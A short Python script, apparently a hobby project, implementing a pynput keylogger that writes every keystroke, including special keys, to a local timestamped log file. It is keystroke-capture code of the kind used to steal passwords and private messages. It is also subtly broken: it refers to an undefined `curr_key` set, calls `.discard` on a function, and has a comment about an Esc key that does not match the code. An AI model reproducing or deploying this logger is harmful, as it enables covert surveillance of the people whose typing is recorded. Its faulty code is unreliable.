from pynput import keyboard 
from datetime import datetime


# curr date n time 
current_time = datetime.now().strftime("%Y-%m-%d_%H_%M_%S") 

#constructs file based on curr date n time 
key_logger_file = f"log_{current_time}.txt" 

# curr pressed keys 
curr_keys = set() 

# function called for every key pressed 
def key_types(key): 
    try: 
        with open(key_logger_file, "a") as log_file: # open allows writing keysteoke without erasing data 
            log_file.write(f"{key.char}") 
    # for pressed like ctrl alt delete 
    except AttributeError: 
        with open(key_logger_file, "a") as log_file: 
            log_file.write(f"[{key}]") 

# to stop listener 
def stop_listener(key): 
    if key == keyboard.Key.ctrl_l: 
        curr_keys.add("ctrl") 
    elif key == keyboard.Key.shift: 
        curr_key.add("shift") 
    elif key == keyboard.KeyCode.from_char("q"): 
        curr_key.add("q")

    # if ctrl+shift+q is pressed 
    if "ctrl" in curr_key and "shift" in curr_key and "q" in curr_key: 
        return False # stops listener 

# remove keys from curr key set when stopped 
def delete_key(key): 
    if key == keyboard.Key.ctrl_l: 
        delete_key.discard("ctrl") 
    elif key == keyboard.Key.shift: 
        delete_key.discard("shift") 
    elif key == keyboard.KeyCode.from_char("q"): 
        delete_key.discard("q")


# starting listener, on release checks for esc key to stop listener 
with keyboard.Listener(on_press=key_types, on_release=stop_listener) as listener: 
    listener.join() # keeps programs running 
